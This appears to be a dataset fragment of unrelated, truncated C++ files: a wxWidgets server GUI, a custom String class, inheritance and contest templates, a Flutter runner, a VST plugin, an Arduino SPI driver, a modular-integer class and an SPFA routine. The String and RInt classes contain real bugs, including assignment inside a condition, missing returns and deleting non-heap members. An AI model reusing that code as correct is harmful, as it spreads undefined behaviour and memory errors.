tc_log->SetValue(tc_log->GetValue()+msg+\"\\n\");\n}\nvoid Frame::on_server(wxSocketEvent& evt){\n wxSocketBase *sock=serv.get_sock()->Accept(false);\n if(!sock->IsOk()){\n  wxMessageBox(wxT(\"Failed to accept the connection\"), wxT(\"Error\"), wxOK|wxICON_ERROR);\n  return;\n }\n sock->SetEventHandler(*this, ID_SOCK);\n sock->SetNotify(wxSOCKET_INPUT_FLAG|wxSOCKET_LOST_FLAG);\n sock->Notify(1);\n}\nvoid Frame::on_sock(wxSocketEvent& evt){\n wxSocketBase* sock=evt.GetSocket();\n switch(evt.GetSocketEvent()){\n  case wxSOCKET_INPUT:{\n   Request rq=serv.process_rq(sock);\n   if(rq.header.size()<=0){\n    #ifdef DEBUG\n    wxMessageBox(wxT(\"Failed to process the connection\"), wxT(\"DEBUG\"), wxOK|wxICON_ERROR);\n    #endif\n   }\n   else{\n    log(rq.header);\n    log(rq.cont);\n   }\n   break;\n  }\n  case wxSOCKET_LOST:{\n   break;\n  }\n  sock->Destroy();\n }\n}\nvoid Frame::on_start(wxCommandEvent& evt){\t\t//TODO: add custom ports\n unsigned short port=8080;\n if(!serv.start(port)){\n  wxMessageBox(wxT(\"Failed to start the server\"), wxT(\"Error\"), wxOK|wxICON_ERROR);\n  return;\n }\n wxSocketServer* sock=serv.get_sock();\n \n sock->SetEventHandler(*this, ID_SERVER);\n sock->SetNotify(wxSOCKET_CONNECTION_FLAG);\n sock->Notify(true);\n update_status();\n}\nvoid Frame::on_stop(wxCommandEvent& evt){\n serv.stop();\n update_status();\n}\nvoid Frame::on_restart(wxCommandEvent& evt){\n serv.stop();\n serv.start();\n}\n\nvoid Frame::on_close(wxCloseEvent& evt){\n this->quit();\n}\n\nvoid Frame::on_quit(wxCommandEvent& evt){\n this->quit();\n}\nvoid Frame::quit(){\n if(!serv.is_started())this->Destroy();\n else{\n  int response;\n  wxMessageDialog question(NULL,wxT(\"The server is still running\\nDo you really want to quit?\"), wxT(\"Question\"), wxYES_NO|wxYES_DEFAULT|wxICON_QUESTION);\n  response=question.ShowModal();\n  if(response==wxID_YES)this->Destroy();\n }\n}\n",
    "#include<iostream>\n#include\"STRING.h\"\nusing namespace std;\n\n\tint String::getStringLength(const char* str)\n\t{\n\t\tint i = 0;\n\t\twhile (str[i] != '\\0')\n\t\t{\n\t\t\ti++;\n\t\t}\n\t\treturn i;\n\t}\n\tchar* String::stringCopy(char* des, const char* src)\n\t{\n\t\tif (des == 0 || src == '\\0')\n\t\t{\n\t\t\treturn nullptr;\n\t\t}\n\t\tint i = 0;\n\t\twhile (src[i] != '\\0')\n\t\t{\n\t\t\tdes[i] = src[i];\n\t\t\ti++;\n\t\t}\n\t\tdes[i] = '\\0';\n\t\treturn des;\n\t}\n\tbool String::isValidIndex(int index)const\n\t{\n\t\treturn(index >= 0 && index < size);\n\t}\n\tint String::numLength(long long int num)\n\t{\n\t\tint len = 0;\n\t\tif (num == 0)\n\t\t{\n\t\t\tlen = 1;\n\t\t}\n\t\telse if (num < 0)\n\t\t{\n\n\t\t\tnum = -num;\n\t\t}\n\t\telse\n\t\t{\n\t\t\twhile (num != 0)\n\t\t\t{\n\t\t\t\tnum = num / 10;\n\t\t\t\tlen++;\n\t\t\t}\n\t\t}\n\t\treturn len;\n\t}\n\n\tString::String()\n\t{\n\t\tdata = nullptr;\n\t\tsize = 0;\n\t}\n\tString::String(const char c)\n\t{\n\t\tsize = 2;\n\t\tdata = new char[size];\n\t\tdata[0] = c;\n\t\tdata[1] = '\\0';\n\t}\n\tString::String(const char* c) :String()\n\t{\n\t\tif (data = nullptr)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\tsize = getStringLength(c) + 1;\n\t\tdata = new char[size];\n\t\tstringCopy(data, c);\n\t\tdata[size - 1] = '\\0';\n\n\t}\n\tString::String(const String& ref) :String()\n\t{\n\t\tif (ref.data == 0)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\tsize = ref.size;\n\t\tdata = new char[size];\n\t\tfor (int i = 0; i < size; i++)\n\t\t{\n\t\t\tdata[i] = ref.data[i];\n\t\t}\n\t}\n\tString:: String(String&& ref)\n\t{\n\t\tdata = ref.data;\n\t\tsize = ref.size;\n\t\tref.data = nullptr;\n\t\tref.size = 0;\n\t}\n\tString& String::operator=(String&& ref)\n\t{\n\t\tthis->~String();\n\n\t\tdata = ref.data;\n\t\tsize = ref.size;\n\t\tref.data = nullptr;\n\t\tref.size = 0;\n\t}\n\tString& String::operator=(const String& ref)\n\t{\n\t\tthis->~String();\n\t\tif (ref.data == 0)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\tsize = ref.size;\n\t\tdata = new char[size];\n\t\tfor (int i = 0; i < size; i++)\n\t\t{\n\t\t\tdata[i] = ref.data[i];\n\t\t}\n\t}\n\t\n\tString::~String()\n\t{\n\t\tdelete[]data;\n\t\tdata = nullptr;\n\t\tsize = 0;\n\t}\n\tvoid String::resize(int newSize)\n\t{\n\t\tif (newSize <= 0)\n\t\t{\n\t\t\tthis->~String();\n\t\t}\n\t\tchar* temp = new char[newSize];\n\t\tint smallerSize = (newSize < size ? newSize : size);\n\t\tfor (int i = 0; i < smallerSize; i++)\n\t\t{\n\t\t\ttemp[i] = data[i];\n\t\t}\n\t\tthis->~String();\n\t\tdata = temp;\n\t\tsize = newSize;\n\t\tdata[size - 1] = '\\0';\n\t}\n\tint String::getLength()const\n\t{\n\t\tint i = 0;\n\t\twhile (data[i] != '\\0')\n\t\t{\n\t\t\ti++;\n\t\t}\n\t\treturn i;\n\t}\n\tchar& String::at(const int index)\n\t{\n\t\tif (isValidIndex(index))\n\t\t{\n\t\t\treturn data[index];\n\t\t}\n\t\texit(0);\n\t}\n\tbool String::isEmpty() const\n\t{\n\t\tif (data == nullptr || data[0] == '\\0')\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t\telse\n\t\t{\n\t\t\treturn false;\n\t\t}\n\t}\n\tint String::getSize() const\n\t{\n\t\treturn size;\n\t}\n\tvoid String::display()const\n\t{\n\t\tif (data)\n\t\t{\n\t\t\tcout << data;\n\t\t}\n\t}\n\tvoid String::makeUpper()\n\t{\n\t\tif (!isEmpty())\n\t\t{\n\t\t\tint i = 0;\n\t\t\twhile (data[i] != '\\0')\n\t\t\t{\n\t\t\t\tif (data[i] >= 'a' && data[i] <= 'z')\n\t\t\t\t{\n\t\t\t\t\tdata[i] = data[i] - 32;\n\t\t\t\t}\n\t\t\t\ti++;\n\t\t\t}\n\t\t}\n\t}\n\tvoid String::makeLower()\n\t{\n\n\t\tif (!isEmpty())\n\t\t{\n\t\t\tint i = 0;\n\t\t\twhile (data[i] != '\\0')\n\t\t\t{\n\t\t\t\tif (data[i] >= 'A' && data[i] <= 'Z')\n\t\t\t\t{\n\t\t\t\t\tdata[i] = data[i] + 32;\n\t\t\t\t}\n\t\t\t\ti++;\n\t\t\t}\n\t\t}\n\t}\n\tvoid String::reverse()\n\t{\n\t\tif (!isEmpty())\n\t\t{\n\t\t\tint i = 0;\n\t\t\tint j = getStringLength(data) - 1;\n\t\t\twhile (i < j)\n\t\t\t{\n\t\t\t\tchar temp = data[i];\n\t\t\t\tdata[i] = data[j];\n\t\t\t\tdata[j] = temp;\n\t\t\t\ti++;\n\t\t\t\tj--;\n\t\t\t}\n\t\t}\n\t}\n\tvoid String::trimLeft()\n\t{\n\t\tint i = 0;\n\t\tint j = 0;\n\t\twhile (data[i] != 0)\n\t\t{\n\t\t\tif (data[i] != '\\n' && data[i] != '\\t' && data[i] != ' ')\n\t\t\t{\n\t\t\t\tdata[j] = data[i];\n\t\t\t\tj++;\n\t\t\t}\n\t\t\ti++;\n\t\t}\n\t\tdata[j] = '\\0';\n\t}\n\tvoid String::trimRight()\n\t{\n\t\tint i = 0;\n\t\tint j = getStringLength(data) - 1;\n\t\twhile (data[j] >= 0)\n\t\t{\n\t\t\tif (data[j] != '\\n' && data[j] != '\\t' && data[j] != ' ')\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tj--;\n\t\t}\n\t\tdata[j + i] = '\\0';\n\t}\n\tvoid String::trim()\n\t{\n\t\ttrimLeft();\n\t\ttrimRight();\n\t}\n\tint String::compareString(const String& s2) const\n\t{\n\t\tint newSize;\n\t\tnewSize = size < s2.size ? size : s2.size;\n\t\tfor (int i = 0; i < newSize; i++)\n\t\t{\n\t\t\tif (data[i] < s2.data[i])\n\t\t\t{\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t\telse if (data[i] > s2.data[i])\n\t\t\t{\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t\treturn 0;\n\t}\n\tvoid String::remove(const int index, const int count = 1)\n\t{\n\t\tif (!isEmpty())\n\t\t{\n\t\t\tint i = index;\n\t\t\tif (!isValidIndex(index))\n\t\t\t{\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tfor (int i = index; i < size - count; i++)\n\t\t\t{\n\t\t\t\tdata[i] = data[i] + count;\n\t\t\t}\n\t\t}\n\t}\n\tString String::concatenate(const String& s2) const\n\t{\n\t\tint i = 0;\n\t\tint j = 0;\n\t\tint len = getLength();\n\t\tint newSize = size + s2.size;\n\t\tchar* temp = new char[newSize];\n\t\twhile (i < getLength())\n\t\t{\n\t\t\ttemp[i] = data[i];\n\t\t\ti++;\n\t\t}\n\t\twhile (j <= s2.getLength())\n\t\t{\n\t\t\ttemp[i] = s2.data[j];\n\t\t\tj++;\n\t\t\ti++;\n\t\t}\n\t\treturn temp;\n\t}\n\tvoid String::concateEqual(const String& s2)\n\t{\n\t\tint i = 0;\n\t\tint len = getLength();\n\t\tint newSize = size + s2.size;\n\t\tthis->resize(newSize);\n\t\tstringCopy(&data[len], &s2.data[i]);\n\t}\n\tvoid String::setNumber(const long long int num)\n\t{\n\t\tint number = num;\n\t\tint size = numLength(number) + 1;\n\t\tdata = new char[size];\n\t\tint i = 0;\n\t\tint count = 0;\n\t\tif (number < 0)\n\t\t{\n\t\t\tcount = 1;\n\t\t\tnum",
    "#include <iostream>\n#include <string>\n\nclass Person {\npublic:\n    Person(const std::string& fname, const std::string& sname)\n        : firstname(fname), secondname(sname) {}\n\n    virtual void printName() const {\n        std::cout << firstname << \" \" << secondname << std::endl;\n    }\n\nprotected:\n    std::string firstname;\n    std::string secondname;\n};\n\nclass Parent : public Person {\npublic:\n    Parent(const std::string& fname, const std::string& sname)\n        : Person(fname, sname) {}\n\n    void printName() const override {\n        std::cout << \"Parent: \" << firstname << \" \" << secondname << std::endl;\n    }\n};\n\nclass Student : public Person {\npublic:\n    Student(const std::string& fname, const std::string& sname)\n        : Person(fname, sname) {}\n\n    void printName() const override {\n        std::cout << \"Student: \" << firstname << \" \" << secondname << std::endl;\n    }\n};\n\nint main() {\n    Parent parent(\"John\", \"Doe\");\n    Student student(\"Mary\", \"Doe\");\n\n    parent.printName();\n    student.printName();\n\n    return 0;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n\n#define INF (int)1e9\n#define PI 3.1415926535897932384626433832795\n#define mod 1000000007\n#define yes cout << \"YES\" << endl \n#define no cout << \"NO\" << endl \n#define pb push_back\n#define l_b lower_bound\n#define u_b upper_bound\n#define all(v) v.begin(), v.end()\n#define rall(v) v.rbegin(), v.rend()\n#define _fastio  ios_base:: sync_with_stdio(false); cin.tie(0); cout.tie(0);\n\ntypedef long long ll;\ntypedef unsigned long long ull;\ntypedef long double ld;\n\ntypedef vector<int> vi;\ntypedef vector<vi> vvi;\ntypedef vector<ll> vl;\ntypedef vector<vl> vvl;\ntypedef vector<char> vc;\ntypedef vector<vc> vvc;\ntypedef pair<int, int> pii;\ntypedef pair<ll, ll> pll;\ntypedef pair<string, string> pss;\ntypedef map<int, int> mii;\ntypedef unordered_map<int, int> umap_ii;\ntypedef unordered_map<string, int> umap_si;\n\n\n/**\n * Limits in C++ for reference\n * _____________________________________________________________________________________\n * |Sr| Macro Name | Description                     | Value\n * |No|____________|_________________________________|__________________________________\n * |1.| ULLONG_MAX | Maximum value unsigned long long| 18,446,744,073,709,551,615 (10^20)\n * |2.| LLONG_MAX  | Maximum value long long         | 9,223,372,036,854,775,807 (10^19)\n * |3.| LLONG_MIN  | Minimum value long long         |-9,223,372,036,854,775,808 -1*(10^19)\n * |4.| INT_MAX    | Maximum value int               | 2,147,483,647 (10^10)\n * |5.| INT_MIN    | Minimum value int               |-2,147,483,648 (10^10)\n*/\n\nvoid solve()\n{\n    // Do your thing here :)\n    \n}\n\n\nint main()\n{\n\n    _fastio;\n    int t;\n    cin >> t;\n    while (t--)\n    {\n        solve();\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chat_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* PdVst v0.0.2 - VST - Pd bridging plugin\n** Copyright (C) 2004 Joseph A. Sarlo\n**\n** This program is free software; you can redistribute it and/orsig\n** modify it under the terms of the GNU General Public License\n** as published by the Free Software Foundation; either version 2\n** of the License, or (at your option) any later version.\n**\n** This program is distributed in the hope that it will be useful,\n** but WITHOUT ANY WARRANTY; without even the implied warranty of\n** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n** GNU General Public License for more details.\n**\n** You should have received a copy of the GNU General Public License\n** along with this program; if not, write to the Free Software\n** Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n**\n** jsarlo@ucsd.edu\n*/\n#include <windows.h>\n#include <math.h>\n#include \"pdvst.hpp\"\n#include <unistd.h>\n\nstatic AudioEffect *effect = 0;\nbool oome = false;\n//HINSTANCE hInstance;\nbool globalIsASynth = false;\nbool globalDebug = false;\nint globalNChannels = 0;\nint globalNPrograms = 0;\nint globalNParams = 0;\nint globalNExternalLibs = 0;\nlong globalPluginId = 'pdvp';\nchar globalExternalLib[MAXEXTERNS][MAXSTRLEN];\nchar globalVstParamName[MAXPARAMS][MAXSTRLEN];\nchar globalPluginPath[MAXFILENAMELEN];\nchar globalVstPluginPath[MAXFILENAMELEN];\nchar globalPluginName[MAXSTRLEN];\nchar globalPdFile[MAXFILENAMELEN];\nchar globalPureDataPath[MAXFILENAMELEN];\nchar globalHostPdvstPath[MAXFILENAMELEN];\nbool globalCustomGui = false;\nint globalCustomGuiWidth= 320;\nint globalCustomGuiHeight= 150;\npdvstProgram globalProgram[MAXPROGRAMS];\nbool globalProgramsAreChunks = false;\n\nchar *trimWhitespace(char *str);\nvoid parseSetupFile();\n\n\n#include \"audioeffect.h\"\n\n//------------------------------------------------------------------------\n/** Must be implemented externally. */\nextern AudioEffect* createEffectInstance (audioMasterCallback audioMaster);\n\nextern \"C\" {\n#if defined (__GNUC__) && ((__GNUC__ >= 4) || ((__GNUC__ == 3) && (__GNUC_MINOR__ >= 1)))\n\t#define VST_EXPORT\t__attribute__ ((visibility (\"default\")))\n#else\n\t#define VST_EXPORT\n#endif\n\nVST_EXPORT AEffect *VSTPluginMain(audioMasterCallback audioMaster)\n{\n\t// get vst version\n\tif (!audioMaster(0, audioMasterVersion, 0, 0, 0, 0))\n        return 0;  // old version\n\n// Create the AudioEffect\n\tAudioEffect* effect = createEffectInstance (audioMaster);\n\tif (!effect)\n\t\treturn 0;\n\n\treturn effect->getAeffect();\n}\n\n// support for old hosts not looking for VSTPluginMain\n#if (TARGET_API_MAC_CARBON && __ppc__)\nVST_EXPORT AEffect* main_macho (audioMasterCallback audioMaster) { return VSTPluginMain (audioMaster); }\n#elif WIN32\nVST_EXPORT AEffect* MAIN (audioMasterCallback audioMaster) { return VSTPluginMain (audioMaster); }\n#elif BEOS\nVST_EXPORT AEffect* main_plugin (audioMasterCallback audioMaster) { return VSTPluginMain (audioMaster); }\n#endif\n\n} // extern \"C\"\n\n\n\n\n#if WIN32\n#include <windows.h>\nvoid* hInstance;\n\nextern \"C\" {\n\nBOOL WINAPI DllMain(HINSTANCE hInst, DWORD dwReason, LPVOID lpvReserved)\n{\n    hInstance = hInst;\n    parseSetupFile();\n    return 1;\n}\n} // extern \"C\"\n#endif\n\n\nchar *trimWhitespace(char *str)\n{\n    char *buf;\n\n    if (strlen(str) > 0)\n    {\n        buf = str;\n        while (isspace(*buf) && (buf - str) <= (int)strlen(str))\n            buf++;\n        memmove(str, buf, (strlen(buf) + 1) * sizeof(char));\n        if (strlen(str) > 0)\n        {\n            buf = str + strlen(str) - 1;\n            while (isspace(*buf) && (buf >= str))\n            {\n                *buf = 0;\n                buf--;\n            }\n        }\n    }\n    return (str);\n}\n\nvoid parseSetupFile()\n{\n    FILE *setupFile;\n    char setupFileName[MAXFILENAMELEN];\n    char tFileName[MAXFILENAMELEN];\n    char line[MAXSTRLEN];\n    char param[MAXSTRLEN];\n    char value[MAXSTRLEN];\n    char vstDataPath[MAXSTRLEN];\n    char vstSetupFileName[MAXSTRLEN];  // path to setup file if it is located in vst subdir\n    int i, equalPos, progNum = -1;\n\n    // find filepaths\n    GetModuleFileName((HMODULE)hInstance,\n\t\t\t\t\t  (LPTSTR)tFileName,\n\t\t\t\t\t  (DWORD)MAXFILENAMELEN);\n\n    if (strrchr(tFileName, '\\\\'))\n    {\n        strcpy(globalPluginName, strrchr(tFileName, '\\\\') + 1);\n    }\n    else\n    {\n        strcpy(globalPluginName, tFileName);\n    }\n\n     // alternate setup file path in vst plugins folder\n     if (strrchr(tFileName, '\\\\'))\n     {\n\n        strcpy(vstDataPath, tFileName);\n\t\t*(strrchr(vstDataPath, '\\\\') + 1) = 0;\n\t\tsprintf(vstDataPath, \"%s%s\\\\\", vstDataPath,globalPluginName);\n\t\t // remove .dll extension (from globalPluginName)\n        if (strstr(vstDataPath, \".dll\"))\n        *(strstr(vstDataPath, \".dll\")) = 0;\n        if (strstr(vstDataPath, \".DLL\"))\n        *(strstr(vstDataPath, \".DLL\")) = 0;\n        sprintf(vstDataPath, \"%s\\\\\", vstDataPath);  //\n        // path to alternate setup file\n        sprintf(vstSetupFileName,\"%s%s\",vstDataPath,globalPluginName);\n        // remove .dll extension\n        if (strstr(vstSetupFileName, \".dl",
    "#include \"RInt.h\"\n\n#pragma region Private\n\n    void RInt::typeCorrection() {\n        if (type == RIntType::POSITIV) {\n            setPositiv();\n        } else if (type == RIntType::NEGATIV) {\n            setNegativ();\n        } else if (type == RIntType::FULLRANGE) {\n            setFullranged();\n        }\n    }\n\n#pragma endregion\n#pragma region Public\n\n    #pragma region Constructors and Destructors\n        RInt::RInt(int modulus, int n, RIntType type) : modulus(modulus), type(type) {\n            this->n = n;\n            switch (type) {\n            case RIntType::POSITIV:\n                setPositiv();\n                break;\n            case RIntType::NEGATIV:\n                setNegativ();\n                break;\n            default:\n                break;\n            }\n        }\n        RInt::RInt(int modulus, int n) {\n            RInt(modulus, n, RIntType::FULLRANGE);\n        }\n        RInt::RInt(int modulus) {\n            RInt(modulus, n, RIntType::FULLRANGE);\n        }\n        RInt::RInt() {\n            RInt(2, 0, RIntType::FULLRANGE);\n        }\n        RInt::~RInt(){\n            delete &n;\n            delete &modulus;\n        }\n\n    #pragma endregion\n\n    #pragma region Getters\n\n        int RInt::getNumber() {\n            typeCorrection();\n            return n;\n        }\n        int RInt::getModulus() {\n            return modulus;\n        }\n        int RInt::getPositiv() {\n            return (n>=0)?n:(n+modulus);\n        }\n        int RInt::getNegativ() {\n            return (n<=0)?n:(n-modulus);\n        }\n        RIntType RInt::getType() {\n            return type;\n        }\n\n    #pragma endregion\n\n    #pragma region Setters\n\n        void RInt::setNumber(int n) {\n            this->n = n;\n            typeCorrection();\n        }\n        void RInt::setModulus(int modulus) {\n            this->modulus = modulus;\n        }\n        void RInt::set(int n, int modulus) {\n            this->modulus = modulus;\n            setNumber(n);\n        }\n        void RInt::setPositiv() {\n            if (n < 0) {\n                while (n < 0) { n += modulus; } \n            } else if (n >= modulus) {\n                while (n >= modulus) { n -= modulus; }\n            }\n        }\n        void RInt::setNegativ() {\n            if (n > 0) {\n                while (n > 0) { n -= modulus; } \n            } else if (n <=  modulus * -1) {\n                while (n <= modulus * -1) { n -= modulus; }\n            }\n        }\n        void RInt::setFullranged() {\n            if (n >= modulus) {\n                setPositiv();\n            } else if (n <= modulus * -1) {\n                setNegativ();\n            }\n        }\n        void RInt::setType(RIntType type) {\n            this->type = type;\n            typeCorrection();\n        }\n    #pragma endregion\n\n#pragma endregion",
    "/*\n  spi_drv.cpp - Library for Arduino Wifi shield.\n  Copyright (c) 2011-2014 Arduino.  All right reserved.\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n*/\n\n#include \"Arduino.h\"\n#include <SPI.h>\n#include \"utility/spi_drv.h\"                   \n#include \"pins_arduino.h\"\n//#define _DEBUG_\nextern \"C\" {\n#include \"utility/debug.h\"\n}\n\n#define DATAOUT     11 // MOSI\n#define DATAIN      12 // MISO\n#define SPICLOCK    13 // sck\n#define SLAVESELECT 10 // ss\n#define SLAVEREADY  7  // handshake pin\n#define WIFILED     9  // led on wifi shield\n\n#define DELAY_SPI(X) { int ii=0; do { asm volatile(\"nop\"); } while (++ii < static_cast<uint32_t>(X*F_CPU/16000000)); }\n#define DELAY_TRANSFER() DELAY_SPI(10)\n\nvoid SpiDrv::begin()\n{\n\t  SPI.begin();\n\t  pinMode(SLAVESELECT, OUTPUT);\n\t  pinMode(SLAVEREADY, INPUT);\n\t  pinMode(WIFILED, OUTPUT);\n\n\t  // digitalWrite(SCK, LOW);\n\t  // digitalWrite(MOSI, LOW);\n\t  digitalWrite(SS, HIGH);\n\t  digitalWrite(SLAVESELECT, HIGH);\n\t  digitalWrite(WIFILED, LOW);\n\n#ifdef _DEBUG_\n\t  INIT_TRIGGER()\n#endif\n}\n\nvoid SpiDrv::end() {\n    SPI.end();\n}\n\nvoid SpiDrv::spiSlaveSelect()\n{\n    digitalWrite(SLAVESELECT,LOW);\n}\n\n\nvoid SpiDrv::spiSlaveDeselect()\n{\n    digitalWrite(SLAVESELECT,HIGH);\n}\n\n\nchar SpiDrv::spiTransfer(volatile char data)\n{\n    char result = SPI.transfer(data);\n    DELAY_TRANSFER();\n\n    return result;                    // return the received byte\n}\n\nint SpiDrv::waitSpiChar(unsigned char waitChar)\n{\n    int timeout = TIMEOUT_CHAR;\n    unsigned char _readChar = 0;\n    do{\n        _readChar = readChar(); //get data byte\n        if (_readChar == ERR_CMD)\n        {\n        \tWARN(\"Err cmd received\\n\");\n        \treturn -1;\n        }\n    }while((timeout-- > 0) && (_readChar != waitChar));\n    return  (_readChar == waitChar);\n}\n\nint SpiDrv::readAndCheckChar(char checkChar, char* readChar)\n{\n    getParam((uint8_t*)readChar);\n\n    return  (*readChar == checkChar);\n}\n\nchar SpiDrv::readChar()\n{\n\tuint8_t readChar = 0;\n\tgetParam(&readChar);\n\treturn readChar;\n}\n\n#define WAIT_START_CMD(x) waitSpiChar(START_CMD)\n\n#define IF_CHECK_START_CMD(x)                      \\\n    if (!WAIT_START_CMD(_data))                 \\\n    {                                           \\\n        TOGGLE_TRIGGER()                        \\\n        WARN(\"Error waiting START_CMD\");        \\\n        return 0;                               \\\n    }else                                       \\\n\n#define CHECK_DATA(check, x)                   \\\n        if (!readAndCheckChar(check, &x))   \\\n        {                                               \\\n        \tTOGGLE_TRIGGER()                        \\\n            WARN(\"Reply error\");                        \\\n            INFO2(check, (uint8_t)x);\t\t\t\t\t\t\t\\\n            return 0;                                   \\\n        }else                                           \\\n\n#define waitSlaveReady() (digitalRead(SLAVEREADY) == LOW)\n#define waitSlaveSign() (digitalRead(SLAVEREADY) == HIGH)\n#define waitSlaveSignalH() while(digitalRead(SLAVEREADY) != HIGH){}\n#define waitSlaveSignalL() while(digitalRead(SLAVEREADY) != LOW){}\n\nvoid SpiDrv::waitForSlaveSign()\n{\n\twhile (!waitSlaveSign());\n}\n\nvoid SpiDrv::waitForSlaveReady()\n{\n\twhile (!waitSlaveReady());\n}\n\nvoid SpiDrv::getParam(uint8_t* param)\n{\n    // Get Params data\n    *param = spiTransfer(DUMMY_DATA);\n    DELAY_TRANSFER();\n}\n\nint SpiDrv::waitResponseCmd(uint8_t cmd, uint8_t numParam, uint8_t* param, uint8_t* param_len)\n{\n    char _data = 0;\n    int ii = 0;\n\n    IF_CHECK_START_CMD(_data)\n    {\n        CHECK_DATA(cmd | REPLY_FLAG, _data){};\n\n        CHECK_DATA(numParam, _data);\n        {\n            readParamLen8(param_len);\n            for (ii=0; ii<(*param_len); ++ii)\n            {\n                // Get Params data\n                //param[ii] = spiTransfer(DUMMY_DATA);\n                getParam(&param[ii]);\n            } \n        }         \n\n        readAndCheckChar(END_CMD, &_data);\n    }     \n    \n    return 1;\n}\n/*\nint SpiDrv::waitResponse(uint8_t cmd, uint8_t numParam, uint8_t* param, uint16_t* param_len)\n{\n    char _data = 0;\n    int i =0, ii = 0;\n\n    IF_CHECK_START_CMD(_data)\n    {\n        CHECK_DATA(cmd | REPLY_FLAG, _data){};\n\n        CHECK_DATA(numParam, _data);\n        {\n            readParamLen16(param_len);\n            for (ii=0; ii<(*param_len); ++ii)\n            {\n               ",
    "#include<bits/stdc++.h>\n#define INF 2147483647\n#define N 500100\n#define M 500100\nconst int mod=1e9+7;\nusing namespace std;\ntypedef long long ll;\ntypedef pair<int,int> PII;\nstruct Edge\n{\n    int from,to;\n    int w;\n    int next;\n}e[M<<1];\nint n,m,idx;\nint head[N],dist[N];\nvoid add(int u,int v,int w)\n{\n    e[idx].from=u,e[idx].to=v;\n    e[idx].w=w;\n    e[idx].next=head[u];\n    head[u]=idx++;\n}\nvoid init()\n{\n    idx=0;\n    scanf(\"%d%d\",&n,&m);\n    for(int i=1;i<=n;i++)\n        head[i]=-1;\n    for(int i=1;i<=m;i++)\n    {\n        int u,v,w;\n        scanf(\"%d%d%d\",&u,&v,&w);\n        //\u975e\u8d1f\u6743\u8fb9\u4e3a\u53cc\u5411\u8fb9\uff0c\u8d1f\u6743\u8fb9\u4e3a\u5355\u5411\u8fb9\n        if(w>=0)\n        {\n            add(u,v,w);\n            add(v,u,w);\n        }\n        else\n            add(u,v,w);\n    }\n}\n//SPFA\u6838\u5fc3\uff1a\u53ea\u6709\u4e0a\u4e00\u8f6e\u521a\u88ab\u677e\u5f1b\u8fc7\u7684\u70b9\uff0c\u624d\u6709\u53ef\u80fd\u5f15\u53d1\u4e0b\u4e00\u6b21\u7684\u677e\u5f1b\u64cd\u4f5c\nqueue<int>q;//\u961f\u5217\u5b58\u7684\u662f\u4e0a\u4e00\u6b21\u521a\u88ab\u677e\u5f1b\u4f46\u8fd8\u6ca1\u6709\u677e\u5f1b\u8fc7\u522b\u4eba\u7684\u70b9\nbool inq[N];//\u8bb0\u5f55\u4e00\u4e2a\u70b9\u662f\u5426\u5728\u961f\u5217\u4e2d\nint cnt[N];//\u4ece\u6e90\u70b9\u5230\u8fd9\u4e2a\u70b9\u7684\u6700\u77ed\u8def\u7ecf\u8fc7\u7684\u8fb9\u6570\n//\u5224\u65ad\u56fe\u4e2d\u662f\u5426\u5b58\u5728\u4ece\u6e90\u70b9x\u51fa\u53d1\u80fd\u5230\u8fbe\u7684\u8d1f\u73af\uff0c\u82e5\u80fd\u8fd4\u56detrue\uff0c\u82e5\u4e0d\u80fd\u8fd4\u56defalse\nbool SPFA(int x)\n{\n    while(!q.empty())\n        q.pop();//\u591a\u7ec4\u6570\u636e\uff0c\u4e00\u5b9a\u8981\u6e05\u7a7a\u961f\u5217\uff01\uff01\uff01\uff01\uff01\uff01\n    for(int i=1;i<=n;i++)\n    {\n        inq[i]=false;\n        cnt[i]=0;\n        dist[i]=0x3f3f3f3f;\n    }\n    dist[x]=0;\n    inq[x]=true;\n    q.push(x);\n    while(!q.empty())\n    {\n        int t=q.front();\n        inq[t]=false;\n        q.pop();//\u677e\u5f1b\u5b8c\u522b\u4eba\uff0c\u51fa\u961f\n        for(int i=head[t];~i;i=e[i].next)\n        {\n            int v1=e[i].to,w1=e[i].w;\n            